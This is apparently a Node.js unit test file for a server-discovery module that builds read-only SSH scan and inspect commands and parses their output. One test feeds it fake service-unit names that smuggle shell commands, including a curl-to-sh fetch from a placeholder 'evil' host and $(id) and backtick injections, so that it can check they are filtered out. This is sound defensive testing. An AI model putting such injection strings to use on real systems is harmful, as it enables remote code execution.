/**
 * Unit tests for host/discover.js: portable command construction, scan/inspect
 * parsers, marker collection, suggestions and read-only guarantees.
 */

import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import test from 'node:test'
import { buildInspectCommand, buildScanCommand, createDiscoverService, parseInspectOutput, parseScanOutput } from '../host/discover.js'

/**
 * Ensure a generated command does not use non-portable or forbidden tools.
 * @param {string} command - shell command.
 */
function assertPortable(command) {
  assert.equal(command.includes('stat -c'), false)
  assert.equal(command.includes('-printf'), false)
  assert.equal(command.includes('readlink -f'), false)
  assert.equal(command.includes('xargs -r'), false)
  if (command.includes('ss ')) assert.match(command, /command -v ss/, 'ss must be guarded by command -v')
  assert.equal(command.includes('cat '), false)
}

test('buildScanCommand emits portable read-only sections', () => {
  const command = buildScanCommand({ roots: ['/opt', '/srv web'], maxDepth: 2, limit: 5 })
  assertPortable(command)
  assert.ok(command.includes('###OS'))
  assert.ok(command.includes('###USER'))
  assert.ok(command.includes('###FIND'))
  assert.ok(command.includes('###PORTS'))
  assert.ok(command.includes('ss -ltn'))
  assert.ok(command.includes('netstat -an'))
  assert.ok(command.includes('###UNITS'))
  assert.ok(command.includes("'/opt'"))
  assert.ok(command.includes("'/srv web'"))
  assert.ok(command.includes('-maxdepth 2'))
  assert.ok(command.includes("'package.json'"))
  assert.ok(command.includes("'docker-compose.yml'"))
  assert.ok(command.includes("'*.jar'"))
  assert.ok(command.includes("'*.war'"))
  assert.ok(command.includes('head -n'))
  assert.equal(command.includes('&&'), false)
})

test('buildScanCommand uses defaults and clamps options', () => {
  const defaults = buildScanCommand()
  for (const root of ['/opt', '/srv', '/var/www', '/data', '/app', '/home']) assert.ok(defaults.includes(`'${root}'`))
  assert.ok(defaults.includes('-maxdepth 3'))

  const clamped = buildScanCommand({ roots: ['/opt'], maxDepth: 99, limit: 9999 })
  assert.ok(clamped.includes('-maxdepth 4'))
  assert.equal(clamped.includes("'/srv'"), false)
})

test('buildScanCommand rejects unsafe roots', () => {
  for (const roots of [[], ['relative'], ['/'], ['/opt/../etc'], ['/opt\n/etc']]) {
    assert.throws(() => buildScanCommand({ roots }), (error) => error.code === 'invalid-path')
  }
})

test('parseScanOutput deduplicates candidates and collects markers', () => {
  const text = [
    '###OS',
    'Linux 6.1.0 x86_64',
    '###USER',
    'deploy',
    '###FIND',
    '/opt/web-api/package.json',
    '/opt/web-api/.git',
    '/opt/web-api/package.json',
    '/opt/other/app.jar',
    '/opt/other/docker-compose.yml',
    '###PORTS',
    '',
    'LISTEN 0 128 0.0.0.0:22 0.0.0.0:*',
    '###UNITS',
    '',
    'web-api.service loaded active running Web API',
  ].join('\n')
  const parsed = parseScanOutput(text)
  assert.equal(parsed.os, 'Linux 6.1.0 x86_64')
  assert.equal(parsed.user, 'deploy')
  assert.equal(parsed.candidates.length, 2)
  assert.deepEqual(parsed.candidates[0], { path: '/opt/web-api', markers: ['package.json', '.git'] })
  assert.deepEqual(parsed.candidates[1], { path: '/opt/other', markers: ['app.jar', 'docker-compose.yml'] })
  assert.equal(parsed.listening.length, 1)
  assert.equal(parsed.services.length, 1)
  assert.equal(parsed.truncated, false)
})

test('parseScanOutput tolerates empty and malformed output', () => {
  const parsed = parseScanOutput('')
  assert.equal(parsed.os, '')
  assert.equal(parsed.user, '')
  assert.deepEqual(parsed.candidates, [])
  assert.deepEqual(parsed.listening, [])
  assert.deepEqual(parsed.services, [])
  assert.deepEqual(parseScanOutput('random text\n###FIND\nrelative/path\n').candidates, [])
})

test('scan service runs the command, caps candidates and records truncation', async () => {
  const calls = []
  const ssh = {
    async exec(record, command, options) {
      calls.push({ record, command, options })
      return {
        exitCode: 0,
        signal: null,
        stdout: '###OS\nLinux\n###USER\nroot\n###FIND\n/opt/a/package.json\n/opt/b/package.json\n/opt/c/package.json\n###PORTS\np1\n###UNITS\nu1\n',
        stderr: '',
        durationMs: 1,
        truncated: false,
      }
    },
  }
  const service = createDiscoverService({ ssh })
  const result = await service.scan({ name: 'server', host: 'h' }, { roots: ['/opt'], maxDepth: 2, limit: 2, timeoutMs: 5000 })
  assert.equal(calls.length, 1)
  assert.equal(calls[0].options.timeoutMs, 5000)
  assert.ok(calls[0].command.includes("'/opt'"))
  assert.equal(result.server, 'server')
  assert.equal(result.candidates.length, 2)
  assert.equal(result.truncated, true)
  assert.deepEqual(result.listening, ['p1'])
  assert.deepEqual(result.services, ['u1'])
})

test('buildInspectCommand is portable and refuses blocked paths', () => {
  const command = buildInspectCommand('/opt/web-api')
  assertPortable(command)
  for (const section of ['###PATH_EXISTS', '###WRITABLE', '###PHYSICAL', '###SIZE_KB', '###TOP', '###MARKERS', '###GIT', '###UNITS']) {
    assert.ok(command.includes(section), section)
  }
  assert.ok(command.includes('pwd -P'))
  assert.ok(command.includes('du -sk'))
  for (const bad of ['/etc', '/', '/usr/local', 'relative']) {
    assert.throws(() => buildInspectCommand(bad), (error) => error.code === 'invalid-path')
  }
})

test('buildInspectCommand runs on the local POSIX shell and never reads file contents', () => {
  const root = mkdtempSync(path.join(tmpdir(), 'dsh-ssh-helper-discover-'))
  try {
    const app = path.join(root, 'web-api')
    mkdirSync(path.join(app, 'src'), { recursive: true })
    mkdirSync(path.join(app, '.git'))
    writeFileSync(path.join(app, 'package.json'), '{"name":"web-api"}', 'utf8')
    writeFileSync(path.join(app, 'app.jar'), 'jar', 'utf8')
    writeFileSync(path.join(app, '.env'), 'TOP_SECRET_VALUE=do-not-leak', 'utf8')

    const command = buildInspectCommand(app)
    const output = execFileSync('/bin/sh', ['-c', command], { encoding: 'utf8' })
    const parsed = parseInspectOutput(output)
    assert.equal(parsed.exists, true)
    assert.equal(parsed.writable, true)
    assert.ok(parsed.physicalPath.length > 0)
    assert.ok(parsed.sizeKB >= 0)
    assert.ok(parsed.markers.includes('package.json'))
    assert.ok(parsed.markers.includes('.git'))
    assert.ok(parsed.markers.includes('app.jar'))
    assert.ok(parsed.topLevel.some((entry) => entry.name === 'src' && entry.type === 'dir'))
    assert.ok(parsed.topLevel.some((entry) => entry.name === 'package.json' && entry.type === 'file' && entry.sizeBytes > 0))
    assert.equal(JSON.stringify(parsed).includes('TOP_SECRET_VALUE'), false)
    assert.equal(output.includes('TOP_SECRET_VALUE'), false)
    assert.equal(parsed.git !== null, true)
    assert.equal(parsed.suggestedUpdateCommand, 'git pull --ff-only')
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('parseInspectOutput parses git, services and suggestions', () => {
  const text = [
    '###PATH_EXISTS',
    'yes',
    '###WRITABLE',
    'yes',
    '###PHYSICAL',
    '/opt/web-api',
    '###SIZE_KB',
    '2048',
    '###TOP',
    '10\tdir\tsrc',
    '123\tfile\tpackage.json',
    '###MARKERS',
    'docker-compose.yml',
    'package.json',
    '###GIT',
    'remote=git@example.com:team/web-api.git',
    'branch=release',
    'commit=deadbeef',
    'dirty=3',
    '###UNITS',
    'web-api.service loaded active running Web API',
    'web-api-worker.service loaded active running Worker',
    'redis\tredis:7',
  ].join('\n')
  const parsed = parseInspectOutput(text)
  assert.equal(parsed.exists, true)
  assert.equal(parsed.writable, true)
  assert.equal(parsed.physicalPath, '/opt/web-api')
  assert.equal(parsed.sizeKB, 2048)
  assert.deepEqual(parsed.topLevel, [
    { name: 'src', type: 'dir', sizeBytes: 10 },
    { name: 'package.json', type: 'file', sizeBytes: 123 },
  ])
  assert.deepEqual(parsed.markers, ['docker-compose.yml', 'package.json'])
  assert.deepEqual(parsed.git, { remote: 'git@example.com:team/web-api.git', branch: 'release', commit: 'deadbeef', dirty: true })
  assert.deepEqual(parsed.serviceUnits, ['web-api.service', 'web-api-worker.service'])
  assert.equal(parsed.suggestedUpdateCommand, 'docker compose pull && docker compose up -d --remove-orphans')
  assert.equal(parsed.suggestedRestartCommand, 'systemctl restart web-api.service')
})

test('parseInspectOutput handles missing paths and no suggestions', () => {
  const parsed = parseInspectOutput('###PATH_EXISTS\nno\n###WRITABLE\nno\n###PHYSICAL\n\n###SIZE_KB\n\n###TOP\n###MARKERS\n###GIT\n###UNITS\n')
  assert.equal(parsed.exists, false)
  assert.equal(parsed.writable, false)
  assert.equal(parsed.physicalPath, '')
  assert.equal(parsed.sizeKB, 0)
  assert.deepEqual(parsed.topLevel, [])
  assert.deepEqual(parsed.markers, [])
  assert.equal(parsed.git, null)
  assert.deepEqual(parsed.serviceUnits, [])
  assert.equal('suggestedUpdateCommand' in parsed, false)
  assert.equal('suggestedRestartCommand' in parsed, false)
})

test('inspect service validates the path and returns the real path', async () => {
  const calls = []
  const ssh = {
    async exec(record, command, options) {
      calls.push({ command, options })
      return {
        exitCode: 0,
        signal: null,
        stdout: '###PATH_EXISTS\nyes\n###WRITABLE\nyes\n###PHYSICAL\n/opt/web-api\n###SIZE_KB\n1\n###TOP\n###MARKERS\n.git\n###GIT\n###UNITS\nweb-api.service loaded active running\n',
        stderr: '',
        durationMs: 1,
        truncated: false,
      }
    },
  }
  const service = createDiscoverService({ ssh })
  const result = await service.inspect({ name: 'server' }, { path: '/opt/web-api/', timeoutMs: 1234 })
  assert.equal(calls.length, 1)
  assert.equal(calls[0].options.timeoutMs, 1234)
  assert.equal(result.path, '/opt/web-api')
  assert.equal(result.exists, true)
  assert.equal(result.suggestedUpdateCommand, 'git pull --ff-only')
  assert.equal(result.suggestedRestartCommand, 'systemctl restart web-api.service')
  await assert.rejects(() => service.inspect({}, { path: '/etc' }), (error) => error.code === 'invalid-path')
  await assert.rejects(() => service.inspect({}, { path: '' }), (error) => error.code === 'invalid-path')
})

test('parseInspectOutput rejects shell metacharacters in service unit names', () => {
  // A hostile deployment host can print anything on stdout: a fake unit name
  // must never become (or be offered as) an injectable restart suggestion.
  const text = [
    '###PATH_EXISTS',
    'yes',
    '###WRITABLE',
    'yes',
    '###PHYSICAL',
    '/opt/web-api',
    '###SIZE_KB',
    '1',
    '###TOP',
    '###MARKERS',
    '.git',
    '###GIT',
    '###UNITS',
    'web-api-;curl$IFS${IFS}http://evil/x|sh.service loaded active running',
    'web-api-name`id`.service loaded active running',
    'web-api-name$(id).service loaded active running',
    'web-api-bad name.service loaded active running',
    'web-api-ok.socket loaded active listening',
    'web-api@blue.service loaded active running',
  ].join('\n')
  const parsed = parseInspectOutput(text)
  assert.deepEqual(parsed.serviceUnits, ['web-api-ok.socket', 'web-api@blue.service'])
  // The surviving units are not `.service` matches for `web-api`, so no restart
  // suggestion is produced at all.
  assert.equal('suggestedRestartCommand' in parsed, false)
})

test('inspect service never suggests a metacharacter-bearing restart command', async () => {
  const ssh = {
    async exec() {
      return {
        exitCode: 0,
        signal: null,
        stdout:
          '###PATH_EXISTS\nyes\n###WRITABLE\nyes\n###PHYSICAL\n/opt/web-api\n###SIZE_KB\n1\n###TOP\n###MARKERS\n###GIT\n###UNITS\nweb-api-;sh.service loaded active running\nweb-api-ok.service loaded active running\n',
        stderr: '',
        durationMs: 1,
        truncated: false,
      }
    },
  }
  const service = createDiscoverService({ ssh })
  const result = await service.inspect({ name: 'server' }, { path: '/opt/web-api' })
  assert.deepEqual(result.serviceUnits, ['web-api-ok.service'])
  assert.equal(result.suggestedRestartCommand, 'systemctl restart web-api-ok.service')
})
